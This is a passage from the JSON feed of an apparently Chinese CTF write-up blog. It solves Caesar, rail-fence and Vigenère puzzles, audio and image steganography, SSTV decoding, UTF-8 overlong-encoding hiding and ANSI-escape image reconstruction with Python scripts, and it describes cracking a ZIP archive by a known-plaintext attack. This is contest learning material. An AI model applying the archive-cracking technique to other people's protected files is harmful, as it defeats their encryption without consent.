Caesar</h3>\n<p>简单的凯撒加密...<br />\n 写个脚本遍历，或者网上找个线上的解密网站一位位地试，或者你能直接猜出来内容，都行...<br />\n 贴个遍历所有结果的脚本：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">model = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class=\"line\">model2 = <span class=\"string\">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">str1 = <span class=\"string\">&quot;Fdhvdu_lv_wrr_Hdcb&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> key <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">27</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> str1:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> s.islower():</span><br><span class=\"line\">            n = model.find(s)</span><br><span class=\"line\">            s = model[n-key]</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> s.isupper():</span><br><span class=\"line\">            n = model2.find(s)</span><br><span class=\"line\">            s = model2[n-key]</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(s, end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><br />\n 得到 flag 内容为 Caesar_is_too_Eazy<br />\n（不觉着放眼望去只有这个能读通吗？）</p>\n<h3 id=\"caesar-2\"><a class=\"anchor\" href=\"#caesar-2\">#</a> Caesar？</h3>\n<p>凯撒 + 栅栏<br />\n密文：fwid_huqifxf {vFv_ghhpwHbddd_q}<br />\n 结合题目知道这不是简单的凯撒，观察密文结构，仔细观察 {} 和 _ 的位置，基本能猜到是栅栏吧。。。</p>\n<p>用上题脚本遍历，挑出 f、c、b 开头的字串逐一尝试栅栏解密，可以得到最终的 flag<br />\n（因为栅栏不会改变第一个字母，所以分别是 flag、cumtctf、bxsctf，逐一尝试即可）。<br />\n虽然理论上来说两个解密的顺序反一反都能出，但这样更好解一点...</p>\n<p>ps：栅栏每组字数为 3</p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"fifo-lru-opt\"><a class=\"anchor\" href=\"#fifo-lru-opt\">#</a> fifo &amp; lru &amp; opt</h3>\n<p>本来还想放提示，没想到做出来的人挺多。<br />\n关于这三个算法，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ob3ViYi5naXRodWIuaW8vMjAyMC8xMC8wNC9vcy0xMC1wYWdlLWV4Y2hhbmdl\">这篇博客</span>上都有了，就不多赘述了。<br />\n如果感兴趣的话，其他相关的算法这篇博客上也都有，挺全面的。</p>\n<p>fifo 算法内存状态为：<br />\n1  2  1  3  2  2  6  6  7  2  1  2  7  2  6<br />\n1  1  1  1  1  1  1  1  7  7  7  7  7  7  7<br />\n2  2  2  2  2  2  2  2  2  1  1  1  1  1<br />\n3  3  3  3  3  3  3  3  2  2  2  2<br />\n6  6  6  6  6  6  6  6  6<br />\n 调入队列为 1  2  3  6  7  1  2</p>\n<p>lru 算法内存状态为：<br />\n1  2  1  3  2  2  6  6  7  2  1  2  7  2  6<br />\n1  1  1  1  1  1  1  1  7  7  7  7  7  7  7<br />\n2  2  2  2  2  2  2  2  2  2  2  2  2  2<br />\n3  3  3  3  3  3  3  1  1  1  1  1<br />\n6  6  6  6  6  6  6  6  6<br />\n 调入队列为 1  2  3  6  7  1</p>\n<p 123671212367112367=\"\">opt 算法内存状态为：<br />\n1  2  1  3  2  2  6  6  7  2  1  2  7  2  6<br />\n1  1  1  1  1  1  1  1  1  1  1  1  1  1  1<br />\n2  2  2  2  2  2  2  2  2  2  2  2  2  2<br />\n3  3  3  3  3  7  7  7  7  7  7  7<br />\n6  6  6  6  6  6  6  6  6<br />\n 调入队列为 1  2  3  6  7<br />\n 三者连起来得到 flag：cumtctf</p>\n<h3 id=\"套\"><a class=\"anchor\" href=\"#套\">#</a> 套！</h3>\n<p>这道题，说实话就是拿来娱乐一下，送送分的 (/▽＼)...<br />\n 分三步：</p>\n<ol>\n<li>新约佛论禅（<span class=\"exturl\" data-url=\"aHR0cDovL2hpLnBjbW9lLm5ldC9idWRkaGEuaHRtbA==\">解密网址</span>）</li>\n<li>Ook!（<span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29sLnlzbmVrby5jb20vYnJhaW5mdWNrLw==\">Brainfuck / Ook!</span>）</li>\n<li>Brainfuck（网址与 Ook 一样）</li>\n</ol>\n<h3 id=\"左右\"><a class=\"anchor\" href=\"#左右\">#</a> 左 &amp; 右</h3>\n<p>音频隐写<br />\n一个原音频（Counting_Stars.wav），一个修改过的（out.wav）</p>\n<p>我出题的过程：把 flag 加密成摩斯密码，把摩斯密码分成两部分，用脚本输出为摩斯电码音频，左右声道分别和原音频相加，同时右声道反向。<br />\n因为左右声道藏的内容不太一样，所以不能直接相加...</p>\n<p>用 Audacity 打开两个音频，放大查看如下（还是挺明显的吧）：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444431/Typera/2023/04/58af7c321f6bb65d3a0870493389096c.png\" alt=\"image-20230426014027631\" /><br />\n 所以，得到摩斯的方法：out 的左声道 - 原音频左声道，可得前半部分 flag，out 的右声道 + 原音频右声道，可得后半部分 flag</p>\n<p>至于怎么加怎么减，我是使用 python 写的脚本，当然还有其他方法（比如有个同学使用的 Au，我是真没想到可以这么解），<br />\n不过个人觉着都可以试着用 python 写写看，这样以后遇到类似的题目，即使可能用不了其他的方法，或许你也可以用 python 解决。<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> wave</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\">ori = wave.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;Counting_Stars.wav&quot;</span>,<span class=\"string\">&#x27;rb&#x27;</span>)\t<span class=\"comment\"># 原音频</span></span><br><span class=\"line\">out = wave.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;out.wav&quot;</span>,<span class=\"string\">&#x27;rb&#x27;</span>)\t\t\t\t<span class=\"comment\"># 隐写音频</span></span><br><span class=\"line\">exp = wave.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;exp.wav&quot;</span>,<span class=\"string\">&#x27;wb&#x27;</span>)\t\t\t\t<span class=\"comment\"># 处理过后得到的摩斯电码音频</span></span><br><span class=\"line\">exp.setnchannels(<span class=\"number\">2</span>)\t\t\t<span class=\"comment\"># 设置声道数为2</span></span><br><span class=\"line\">exp.setsampwidth(<span class=\"number\">2</span>)\t\t\t<span class=\"comment\"># 设置量化位数为2</span></span><br><span class=\"line\">exp.setframerate(<span class=\"number\">44100</span>)\t\t<span class=\"comment\"># 设置采样频率为44100</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(out.getnframes()):\t\t\t<span class=\"comment\"># 一帧帧地读取数据</span></span><br><span class=\"line\">\tlori,rori=struct.unpack(<span class=\"string\">&#x27;hh&#x27;</span>, ori.readframes(<span class=\"number\">1</span>))\t<span class=\"comment\"># 原音频左右声道数据分别存入lori、rori</span></span><br><span class=\"line\">\tlout,rout=struct.unpack(<span class=\"string\">&#x27;hh&#x27;</span>, out.readframes(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tlexp = lout - lori\t\t<span class=\"comment\"># 左声道相减，存入lexp</span></span><br><span class=\"line\">\trexp = rout + rori</span><br><span class=\"line\">\texp.writeframes(struct.pack(<span class=\"string\">&#x27;hh&#x27;</span>,lexp,rexp))\t\t<span class=\"comment\"># 把lexp、rexp的数据打包后存入exp.wav</span></span><br></pre></td></tr></table></figure><br />\n 解出 exp.wav 之后，去摩斯解密的网站解密即可得到 flag 的内容。</p>\n<h3 id=\"嘿嘿压缩包\"><a class=\"anchor\" href=\"#嘿嘿压缩包\">#</a> 嘿嘿，压缩包？</h3>\n<p>简单的 LSB + ZIP 压缩包 + SSTV</p>\n<p>给了一张图和一个压缩包，<br />\n注意图片的名字是 hint.png。。。</p>\n<p>stegsolve 打开，LSB 隐写能看到提示信息：<br />\n1.Plaintext_Attack 2. zSdL#Z7oym!9j8m3</p>\n<p>第一个提示明文攻击，第二个是密码<br />\n（可能是我的密码设置的有问题？最后一位是 3，可能有点迷惑性...）</p>\n<p>打开压缩包，里面有一个名字一样的图片，用同样的压缩算法压缩已知图片，观察二者的 CRC 校验码一致，结合之前的提示，用 ARCHPR 使用明文攻击解开<br />\n（这里出 bug 了，最后压缩的时候放错了一个压缩包，导致明文攻击失败，现文件已更新）<br />\n明文攻击后，可以获得压缩包 flag.zip，可使用之前 LSB 得到的密码解开.</p>\n<p>解开后，获得音频文件 flag.wav，可以听出来是 SSTV  （。＾▽＾）</p>\n<p>最后，使用 robot36 解码 SSTV 音频，可以解出图片如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444438/Typera/2023/04/d80937655349012b4803de6fadc1e8de.png\" alt=\"image-20230426014034071\" /><br />\n（robot36 为安卓端软件)</p>\n<p>扫码得到 flag</p>\n<h3 id=\"12_bubu_cli\"><a class=\"anchor\" href=\"#12_bubu_cli\">#</a> 12_bubu_cli</h3>\n<p>nc 81.68.81.111 2333<br />\n 输出如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444445/Typera/2023/04/9aacfad409013817db6c5378063a2777.png\" alt=\"image-20230426014040530\" /></p>\n<p>先仔细观察一下输出的东西，在命令行里，我们可以发现，输出的是一些带颜色的数字 9，这些数字 9 组成了一张张的图片。（应该能看出来是几张图片，对吧）</p>\n<p>然后我们把输出的内容保存到文本文件里查看：nc 81.68.81.111 2333 &gt; 1.txt<br />\n 大致内容如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444454/Typera/2023/04/8032d3085f735ce7f02fb11e33c5ca60.png\" alt=\"image-20230426014048819\" /></p>\n<p>可以看到， <code>&lt;0x1b&gt;[</code> （即  <code>\\x1b[</code> ）将文本分割成了很多组，这就是 ANSI 转义字符。</p>\n<p>ANSI 转义字符用  <code>ESC[</code> 打头，而 <code>ESC</code>  用 ASCII 码表示为 <code>\\x1b</code> （十六进制的 <code>1b</code> ）</p>\n<p>涉及到的转义字符<strong>解释</strong>：<br />\n <code>\\x1b[nA</code> ：光标上移 n 行<br />\n <code>\\x1b[38;</code> ：设置前景色，后跟  <code>5;n</code>  代表使用 8 位 256 颜色码，后跟  <code>2;r;g;b</code>  代表 24 位 RGB 颜色码；后接 m 加字符，即为显示的字符</p>\n<p>比如 <code>\\x1b[38;2;0;0;0m5</code> ，就是输出黑色的 5.</p>\n<p>该文件里的输出都是使用 <code>\\x1b[38;2;r;g;bm9</code> ，<br />\n也就是说，我们只要提取出这些字符中间的 r g b 三位，然后用 PIL 组合成图片就行了。</p>\n<p>除此之外，我们还可以注意到：基本上每隔一段字符，会出现固定长度的一串 <code>\\x1b[nA</code> ，<br />\n从上述的解释中，我们已经可以知道，这是让光标上移的转义字符，<br />\n因此，我们大概能够知晓，输出的图片应该就是被这些字符分割的。</p>\n<p>所以，我们可以推断出，图片的长度应该是 <code>\\x1b[nA</code>  字符的个数 -1，<br />\n从而我们获得了图片的长度为 200，<br />\n同样的，我们也可以通过统计一行上 <code>\\x1b[38;</code>  字符的个数，确定宽度也为 200.<br />\n（这两个数据都是使用 PIL 生成图片时必须的）</p>\n<p>转换脚本如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;1.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">    farmes = fp.read().split(<span class=\"string\">&quot;\\x1b[A&quot;</span>*<span class=\"number\">201</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\">farmes.pop(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> frame <span class=\"keyword\">in</span> farmes:</span><br><span class=\"line\">    rgb_list = re.findall(<span class=\"string\">r&quot;\\[38;2;(\\d*);(\\d*);(\\d*)m&quot;</span>, frame)</span><br><span class=\"line\">    <span class=\"comment\"># print(frame)</span></span><br><span class=\"line\">    img = Image.new(<span class=\"string\">&quot;RGB&quot;</span>, (<span class=\"number\">200</span>,<span class=\"number\">200</span>))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> w <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(img.size[<span class=\"number\">0</span>]):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(img.size[<span class=\"number\">1</span>]):</span><br><span class=\"line\">            r, g, b = rgb_list[h*<span class=\"number\">200</span> + w]</span><br><span class=\"line\">            img.putpixel((w, h), (<span class=\"built_in\">int</span>(r), <span class=\"built_in\">int</span>(g), <span class=\"built_in\">int</span>(b)))</span><br><span class=\"line\">    img.save(<span class=\"string\">f&quot;frame/<span class=\"subst\">&#123;<span class=\"built_in\">str</span>(i).zfill(<span class=\"number\">4</span>)&#125;</span>.png&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Saved frame/<span class=\"subst\">&#123;<span class=\"built_in\">str</span>(i).zfill(<span class=\"number\">4</span>)&#125;</span>.png&quot;</span>)</span><br><span class=\"line\">    i += <span class=\"number\">1</span></span><br></pre></td></tr></table></figure></p>\n<p>现在我们仔细观察一下获得的 29 张图片：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444466/Typera/2023/04/fb1417256ebdb703f6b023d21836f2bf.png\" alt=\"image-20230426014102173\" /></p>\n<p>放大细看，可以发现，大部分图片上都有几个随机出现白点：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444483/Typera/2023/04/02f03d1a519726d4487be9f6f0e3ea8d.png\" alt=\"image-20230426014119100\" /></p>\n<p>无论你是用 ps 还是 画图 或者是其他什么工具查看这些白点的像素，你都会发现它们的 RGB 为（233,233,233）</p>\n<p>接下来的思路是：把 29 张图中 RGB 为（233,233,233）的点提取出来，组成一张新图。<br />\n脚本如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\">flag_img=Image.new(<span class=\"string\">&#x27;RGB&#x27;</span>,(<span class=\"number\">200</span>,<span class=\"number\">200</span>))</span><br><span class=\"line\"><span class=\"keyword\">for</span> name <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">29</span>):</span><br><span class=\"line\">    img = Image.<span class=\"built_in\">open</span>(<span class=\"string\">f&quot;frame/<span class=\"subst\">&#123;<span class=\"built_in\">str</span>(name).zfill(<span class=\"number\">4</span>)&#125;</span>.png&quot;</span>)</span><br><span class=\"line\">    img = img.convert(<span class=\"string\">&quot;RGB&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> w <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(img.size[<span class=\"number\">0</span>]):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(img.size[<span class=\"number\">1</span>]):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> img.getpixel((w,h)) == (<span class=\"number\">233</span>,<span class=\"number\">233</span>,<span class=\"number\">233</span>):</span><br><span class=\"line\">                flag_img.putpixel((w,h),(<span class=\"number\">233</span>,<span class=\"number\">233</span>,<span class=\"number\">233</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">flag_img.save(<span class=\"string\">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure><br />\n 获得的图片如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444530/Typera/2023/04/0abbeb74a9829e5975738dce464003bf.png\" alt=\"cumtctf2022wp14\" /></p>\n",
            "tags": [
                "Python",
                "Crypto",
                "CTF",
                "Misc",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/TQLCTF-MISC-Ranma%C2%BD/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/TQLCTF-MISC-Ranma%C2%BD/",
            "title": "TQLCTF-MISC-Ranma½",
            "date_published": "2022-02-22T14:36:41.000Z",
            "content_html": "<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"ranma12\"><a class=\"anchor\" href=\"#ranma12\">#</a> Ranma½</h3>\n<p>终归还是少了点经验，以及一些奇奇怪怪的知识。。。</p>\n<h4 id=\"utf-8可变长编码\"><a class=\"anchor\" href=\"#utf-8可变长编码\">#</a> UTF-8 可变长编码</h4>\n<p>首先一定要详细了解 UTF-8 编码，<br />\n完整的表如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682438191/Typera/2023/04/fdfd2d8940cbcb3dad4d6ee71124333c.png\" alt=\"image-20230425235627337\" /></p>\n<blockquote>\n<p>图中一行的  <code>xxx...</code>  部分组合起来即为对应的 Unicode 代码</p>\n</blockquote>\n<p>可能这样还是比较难以理解，那就仔细阅读下面的例子就行了：</p>\n<p>希伯来语字母 א 的 Unicode 代码是 U+<strong>05D0</strong>，UTF-8 是 <strong>0xD7 0x90</strong>，<br />\n则 Unicode to UTF-8 转换如下：</p>\n<ul>\n<li>首先判断它属于哪一行：<br />\nU+0080 到 U+07FF，观察表中对应行，说明它使用双字节，即 110<strong>xxxxx</strong> 10<strong>xxxxxx</strong></li>\n<li>然后分解十六进制的<strong> 0x05D0</strong>，换算成二进制就是（0）101-1101-0000</li>\n<li>最后，把这 11 位数按顺序填入前后的 &quot;x&quot; 部分：110<strong>10111</strong> 10<strong>010000</strong></li>\n</ul>\n<p>110<strong>10111</strong> 10<strong>010000</strong> 换成 16 进制就是 <strong>D7 90</strong>，即对应的 UTF-8 编码</p>\n<p>看懂了上述例子，UTF-8 to Unicode 就是简单反过来就行了</p>\n<h4 id=\"信息隐藏的思路\"><a class=\"anchor\" href=\"#信息隐藏的思路\">#</a> 信息隐藏的思路</h4>\n<p>到这里，我们就了解了 UTF-8 编码 “可变长” 的特点，<br />\n既然它是可变长的，那么我们就可以利用<strong>这个特性</strong>去隐藏信息：<br />\n直接用一般的文本编辑器打开题目给的文件，会有很多乱码，因为它们大多是逐字节转换的，而 UTF-8 的单个字符 可能有 1~4 个字节的长度，</p>\n<p>因此，如果我们要隐藏 <strong>A</strong> 字符，Unicode 就是 <strong>0x41</strong>，换算成二进制就是 <strong>100 0001</strong>，<br />\n再假设我们要把它藏到 UTF-8 编码的<strong>第二行 U+0080 到 U+07FF</strong> 里面，那么我们一共需要 11 个数字，<br />\n于是人为地在高位填充 4 个 0，得到：<strong>000-0100-0001</strong>，再将这 11 个数字填入表中对应的 x 部分，就得到：110<strong>00001</strong> 10<strong>000001</strong>，即 UTF-8 编码的 <strong>C1 81</strong>，从而骗过大部分的文本编辑器</p>\n<h4 id=\"解题过程\"><a class=\"anchor\" href=\"#解题过程\">#</a> 解题过程</h4>\n<p>实际上有挺多方法，用 vim 打开，或者用 WinRAR 的 “查看” 打开（这个属实有点奇怪）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682438200/Typera/2023/04/1771f16334a694ed24fac59a74971010.png\" alt=\"image-20230425235636085\" /><br />\n 或者可以写脚本分析：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\">x,y,z=[],[],[]</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;Ranma&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">\t<span class=\"keyword\">try</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\tStr = f.read(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"keyword\">not</span> Str:<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\tx.append(binascii.hexlify(Str))</span><br><span class=\"line\">\t<span class=\"keyword\">finally</span>:</span><br><span class=\"line\">\t\tf.close() <span class=\"comment\"># 读文件，将16进制字串存入list x</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(x)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"built_in\">int</span>(x[i],<span class=\"number\">16</span>)&lt;<span class=\"number\">128</span>:</span><br><span class=\"line\">\t\ty.append(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(x[i],<span class=\"number\">16</span>))) <span class=\"comment\"># 小于128的直接chr()转换ASCII码</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"built_in\">int</span>(x[i],<span class=\"number\">16</span>)&gt;<span class=\"number\">127</span>:</span><br><span class=\"line\">\t\ty.append(<span class=\"built_in\">bin</span>(<span class=\"built_in\">int</span>(x[i],<span class=\"number\">16</span>))) <span class=\"comment\"># 大于128的转换为二进制分析</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(y)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27;0b110&#x27;</span> <span class=\"keyword\">in</span> y[i]: <span class=\"comment\"># 如果是第二行的情况</span></span><br><span class=\"line\">\t\ty[i]=<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(y[i][<span class=\"number\">5</span>:]+(y[i+<span class=\"number\">1</span>])[<span class=\"number\">4</span>:],<span class=\"number\">2</span>))</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27;0b1110&#x27;</span> <span class=\"keyword\">in</span> y[i]: <span class=\"comment\"># 如果是第三行的情况</span></span><br><span class=\"line\">\t\ty[i]=<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(y[i][<span class=\"number\">6</span>:]+(y[i+<span class=\"number\">1</span>])[<span class=\"number\">4</span>:]+(y[i+<span class=\"number\">2</span>])[<span class=\"number\">4</span>:],<span class=\"number\">2</span>))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(y)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27;0b&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> y[i]: <span class=\"comment\"># 去除多余项并合并</span></span><br><span class=\"line\">\t\tz.append(y[i])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>.join(z))</span><br></pre></td></tr></table></figure><br />\n 得到：</p>\n<blockquote QFOLP6_KRZ1Q=\"\">\n<p>KGR/QRI 10646-1 zswtqgg d tnxcs tsdtofbrx osk ndnzhl gna Ietygfviy Idoilfvsu Arz (QQJ) hkkqk maikaglvusv ubyp cw ekg krzyj'o kitwkbj alypsdd.  Wjs rzvmebrwoa duwcuosu pqecgqamo cw ekg IFA, uussmpu, ysum aup qfxschljyk swks pcbb khxnsee drdoqpgpwfyv cbg xeupctzou, oql gneg ylv nsg bb zds upygzrxzkjh fq XVT-8, wpr uxxvnw qt wpvy isdz. XVT-8 kif zds tsdtofbrxegktf qt szryafmtqi hkm sahz LD-DUQLQ egjuv, auqjllvtc qfxschljvrehp hlvv iqyk omjehog, sieyafj lqf cwprx ocwezcfh bugp fvwb qb XA-NYYWZ gdniha oap oip wtoqacgnsee wq cwprx rocfhu. HTTPZB</p>\n</blockquote>\n<p>观察猜测是维吉尼亚加密，</p>\n<ol>\n<li>\n<p>直接爆破 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGNvZGUuZnIvdmlnZW5lcmUtY2lwaGVy\">在线网址</span> ：<br />\n点击 AUTOMATIC DECRYPTION，爆破即可</p>\n</li>\n<li>\n<p>看官方 wp，（这个密钥要拿到脑洞也太大了吧。。。）<br />\n依次列举出 UTF-8 编码文字的长度，长度为 1 的字符转换为<strong>点</strong>，长度为 2 的字符转换为<strong>线</strong>，长度为 3 的字符转换成<strong>分隔符</strong>，经过 <strong>Morse</strong> 解读获得密钥<br />\n (￣▽￣)&quot;<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682438209/Typera/2023/04/150cd961046421d365382e0994f34fba.png\" alt=\"image-20230425235644738\" /><br />\nflag： <code>TQLCTF&#123;CODIN6_WOR1D&#125;</code></p>\n</li>\n</ol>\n",
            "tags": [
                "Python",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/2022hgame-week1/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/2022hgame-week1/",
            "title": "2022hgame week1",
            "date_published": "2022-02-05T04:46:27.000Z",
            "content_html": "<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"dancing_line\"><a class=\"anchor\" href=\"#dancing_line\">#</a> Dancing_Line</h3>\n<p>有点靠脑洞啊，这道 crypto 不讲武德 /_ \\ ，不过仔细看看还是大概能猜到的～</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437580/Typera/2023/04/d902f3ec8dfa08547fca2ab2f0d0f237.bmp\" alt=\"\" /><br />\n图片上有一条线，放大可以看出，每隔一小段会有一个黑点<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437729/Typera/2023/04/f02b3b2084d99f2b7639a572df5b0d8a.png\" alt=\"image-20230425234706530\" /><br />\n 所以，我用 python PIL 库写个脚本导出黑点的坐标</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> 